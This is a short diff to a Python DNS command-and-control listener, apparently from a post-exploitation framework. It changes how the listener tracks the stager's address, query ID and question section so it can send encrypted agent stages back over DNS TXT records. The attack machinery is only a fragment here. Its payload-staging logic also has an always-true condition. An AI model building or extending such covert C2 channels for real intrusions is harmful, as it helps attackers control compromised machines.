@@ -575,7 +575,7 @@ def send_message(packets=None):
         sock.sendto(bytes(reply), reply_addr_tuple)
         txt_request, txt_addr = sock.recvfrom(512)
         txt_dns = DNS(txt_request)
-        return txt_dns[DNSQR].qname
+        return txt_dns[DNSQR].qname, txt_addr, txt_dns.id, txt_dns.qd
         
     def is_eof_response(self, dns):
         if str(dns[DNSQR].qname).startswith("smtp"):
@@ -740,14 +740,14 @@ def send_message(packets=None):
     def send_crypto_to_stager(self, hostname, sock, stagingKey, listenerOptions, routingPacket, addr, ipack, txtstoptransfer, reply_id, reply_qd):
         m = hashlib.sha256(routingPacket)
         print "SHA256 of routingPacket {}".format(m.hexdigest())
-        hostname = self.send_txt_record_reply_id(sock, hostname, ipack, addr, reply_id, reply_qd)
+        stager_hostname, stager_addr, stager_id, stager_qd = self.send_txt_record_reply_id(sock, hostname, ipack, addr, reply_id, reply_qd)
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
         if dataResults and len(dataResults) > 0:
             for (language, results) in dataResults:
                 if results:
                     if not results.startswith('STAGE0') or not results.startswith('STAGE2') or not results.startswith('ERROR'):
-                        print "send_crypto_to_stager - About to send to {} with payload len {}".format(hostname, len(results))
-                        self.send_payload_via_txt(hostname, sock, results, addr, txtstoptransfer, reply_id, reply_qd)
+                        print "send_crypto_to_stager - About to send to {} with payload len {}".format(stager_hostname, len(results))
+                        self.send_payload_via_txt(stager_hostname, sock, results, stager_addr, txtstoptransfer, stager_id, stager_qd)
 
     # Stage 6
     def send_agent_to_stager(self, hostname, stagingKey, sock, stager_crypto, listenerOptions, addr, ipack, txtstoptransfer, reply_id, reply_qd):
